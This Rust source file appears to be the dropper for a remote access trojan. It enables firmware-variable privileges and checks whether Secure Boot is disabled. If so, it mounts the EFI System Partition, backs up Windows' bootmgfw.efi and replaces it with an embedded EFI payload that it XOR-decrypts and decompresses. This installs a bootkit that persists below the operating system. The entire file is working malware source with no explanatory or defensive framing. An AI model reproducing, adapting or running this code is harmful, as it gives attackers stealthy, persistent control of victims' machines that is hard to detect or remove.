use std::ffi::c_void;
use std::path::PathBuf;
use std::{fs, io, ptr};

use rat_common::utils::DropGuard;
use rat_dropper::{EFI_APPLICATION_ENCRYPTED, EFI_APPLICATION_KEY, ESP_GUID};
use windows_sys::Win32::Foundation::{
    CloseHandle, ERROR_NO_MORE_FILES, ERROR_SUCCESS, GetLastError, HANDLE, INVALID_HANDLE_VALUE,
    LUID, MAX_PATH,
};
use windows_sys::Win32::Security::{
    AdjustTokenPrivileges, LUID_AND_ATTRIBUTES, LookupPrivilegeValueW, SE_PRIVILEGE_ENABLED,
    TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, DeleteVolumeMountPointW, FILE_SHARE_READ, FILE_SHARE_WRITE, FindFirstVolumeW,
    FindNextVolumeW, FindVolumeClose, OPEN_EXISTING, SetVolumeMountPointW,
};
use windows_sys::Win32::System::IO::DeviceIoControl;
use windows_sys::Win32::System::Ioctl::{
    IOCTL_DISK_GET_PARTITION_INFO_EX, PARTITION_INFORMATION_EX, PARTITION_STYLE_GPT,
};
use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
use windows_sys::Win32::System::WindowsProgramming::GetFirmwareEnvironmentVariableW;
use windows_sys::core::GUID;
use windows_sys::w;

fn write_decrypted_payload(f: &mut fs::File) -> io::Result<()> {
    let decompressed = EFI_APPLICATION_ENCRYPTED
        .iter()
        .zip(EFI_APPLICATION_KEY.iter().cycle())
        .map(|(&c, &k)| c ^ k)
        .collect::<Vec<u8>>();

    let mut decompressor = zstd::Decoder::new(decompressed.as_slice())?;
    io::copy(&mut decompressor, f)?;

    Ok(())
}

fn adjust_privileges() -> bool {
    let mut token = HANDLE::default();
    if unsafe {
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token,
        ) == 0
    } {
        let error = unsafe { GetLastError() };
        eprintln!("OpenProcessToken error: 0x{error:X} ({error})");
        return false;
    }

    let guard = DropGuard::new(token, |t| unsafe {
        CloseHandle(t);
    });

    let mut luid = LUID::default();
    if unsafe {
        LookupPrivilegeValueW(
            ptr::null_mut(),
            w!("SeSystemEnvironmentPrivilege"),
            &mut luid,
        ) == 0
    } {
        let error = unsafe { GetLastError() };
        eprintln!("LookupPrivilegeValueW error: 0x{error:X} ({error})");
        return false;
    }

    let privileges = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    unsafe {
        let _ = AdjustTokenPrivileges(token, 0, &privileges, 0, ptr::null_mut(), ptr::null_mut());
    }
    if unsafe { GetLastError() != ERROR_SUCCESS } {
        let error = unsafe { GetLastError() };
        eprintln!("AdjustTokenPrivileges error: 0x{error:X} ({error})");
        return false;
    }

    drop(guard);
    true
}

fn is_equal_guid(guid1: &GUID, guid2: &GUID) -> bool {
    guid1.data1 == guid2.data1
        && guid1.data2 == guid2.data2
        && guid1.data3 == guid2.data3
        && guid1.data4 == guid2.data4
}

fn is_esp_volume(volname: &mut [u16]) -> bool {
    let backslash = unsafe { *w!("\\") };
    let volname_ptr = volname.as_ptr();

    let guard0 = if let Some(last) = volname.last_mut()
        && *last == backslash
    {
        *last = 0;
        Some(DropGuard::new(last, |c| {
            *c = backslash;
        }))
    } else {
        None
    };

    let volume = unsafe {
        CreateFileW(
            volname_ptr,
            0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            ptr::null_mut(),
            OPEN_EXISTING,
            0,
            ptr::null_mut(),
        )
    };
    if volume == INVALID_HANDLE_VALUE {
        let error = unsafe { GetLastError() };
        eprintln!("CreateFileW error: 0x{error:X} ({error})");
        return false;
    }

    let guard1 = DropGuard::new(volume, |v| unsafe {
        CloseHandle(v);
    });

    let mut partition_info = PARTITION_INFORMATION_EX::default();
    let mut returned = 0;
    if unsafe {
        DeviceIoControl(
            volume,
            IOCTL_DISK_GET_PARTITION_INFO_EX,
            ptr::null_mut(),
            0,
            &mut partition_info as *mut PARTITION_INFORMATION_EX as *mut c_void,
            size_of_val(&partition_info) as u32,
            &mut returned,
            ptr::null_mut(),
        ) == 0
    } {
        let error = unsafe { GetLastError() };
        eprintln!("DeviceIoControl error: 0x{error:X} ({error})");
        return false;
    }

    if partition_info.PartitionStyle != PARTITION_STYLE_GPT {
        return false;
    }

    let gpt = &unsafe { partition_info.Anonymous.Gpt };
    if !is_equal_guid(&gpt.PartitionType, &ESP_GUID) {
        return false;
    }

    drop(guard1);
    drop(guard0);
    true
}

fn mount_esp_and_setup_persistence() -> bool {
    let mut volname = [0; MAX_PATH as usize];

    let volume = unsafe { FindFirstVolumeW(volname.as_mut_ptr(), volname.len() as u32) };
    if volume == INVALID_HANDLE_VALUE {
        let error = unsafe { GetLastError() };
        eprintln!("FindFirstVolumeW error: 0x{error:X} ({error})");
        return false;
    }

    let guard = DropGuard::new(volume, |v| unsafe {
        FindVolumeClose(v);
    });

    loop {
        // volname[len] = L'\0'
        // volname[len - 1] = L'\\' (possibly)
        let len = volname
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(volname.len());
        if is_esp_volume(&mut volname[..len]) {
            let name = String::from_utf16_lossy(&volname[..len]);
            println!("Found ESP volume {name:?}");

            if unsafe { SetVolumeMountPointW(w!("S:\\"), volname.as_ptr()) } == 0 {
                let error = unsafe { GetLastError() };
                eprintln!("SetVolumeMountPointW error: 0x{error:X} ({error})");
                return false;
            }

            println!("Mounted ESP to S:\\");
            let guard2 = DropGuard::new((), |_| {
                let status = unsafe { DeleteVolumeMountPointW(w!("S:\\")) };

                if status == 0 {
                    let error = unsafe { GetLastError() };
                    eprintln!("DeleteVolumeMountPointW error: 0x{error:X} ({error})");
                } else {
                    println!("Unmounted ESP from S:\\");
                }
            });

            let bootdir = PathBuf::from("S:\\EFI\\Microsoft\\Boot");
            let bootmgfw_old = bootdir.join("bootmgfw_old.efi");
            let bootmgfw = bootdir.join("bootmgfw.efi");

            if !bootmgfw_old.exists()
                && let Err(e) = fs::copy(&bootmgfw, &bootmgfw_old)
            {
                eprintln!("Failed to backup original bootmgfw.efi: {e}");
                return false;
            }

            match fs::File::create(&bootmgfw) {
                Ok(mut f) => {
                    if let Err(e) = write_decrypted_payload(&mut f) {
                        eprintln!("Failed to write EFI application to bootmgfw.efi: {e}");
                        drop(f);

                        // Restore original bootmgfw.efi
                        let _ = fs::remove_file(&bootmgfw);
                        let _ = fs::copy(&bootmgfw_old, &bootmgfw);

                        return false;
                    }
                }
                Err(e) => {
                    eprintln!("Failed to open bootmgfw.efi for writing: {e}");
                    return false;
                }
            }

            drop(guard2);
            return true;
        }

        volname.fill(0);

        if unsafe { FindNextVolumeW(volume, volname.as_mut_ptr(), volname.len() as u32) } == 0 {
            let error = unsafe { GetLastError() };
            if error != ERROR_NO_MORE_FILES {
                eprintln!("FindNextVolumeW error: 0x{error:X} ({error})");
            }

            break;
        }
    }

    drop(guard);
    false
}

fn main() {
    if !adjust_privileges() {
        return;
    }

    println!("Adjusted privileges successfully");

    let mut buffer = [0; 128];
    let received = unsafe {
        GetFirmwareEnvironmentVariableW(
            w!("SecureBoot"),
            w!("{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}"),
            buffer.as_mut_ptr() as *mut c_void,
            size_of_val(&buffer) as u32,
        )
    };

    if received == 0 {
        let error = unsafe { GetLastError() };
        eprintln!("GetFirmwareEnvironmentVariableW error: 0x{error:X} ({error})");
        return;
    }

    assert_eq!(received, 1);

    let secure_boot = buffer[0] == 1;
    println!("Secure Boot = {secure_boot}");
    if !secure_boot {
        mount_esp_and_setup_persistence();
    }
}
